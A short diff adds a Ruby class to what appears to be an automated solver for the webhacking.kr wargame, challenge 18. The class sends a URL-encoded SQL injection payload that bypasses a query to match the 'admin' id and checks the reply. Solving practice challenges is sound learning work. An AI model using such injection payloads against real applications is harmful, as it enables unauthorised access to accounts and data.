@@ -454,6 +454,22 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 18
+  class Challenge18 < ChallengeBase
+    CHALLENGE = 18
+
+    PATH = '/challenge/web-32/'
+    QUERY = '?no='
+    PAYLOAD = %q[''OR`id`='admin']
+
+    def exec
+      payload = URI.encode_www_form_component(PAYLOAD)
+      response = get("#{PATH}#{QUERY}#{payload}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 19
   class Challenge19 < ChallengeBase
     CHALLENGE = 19
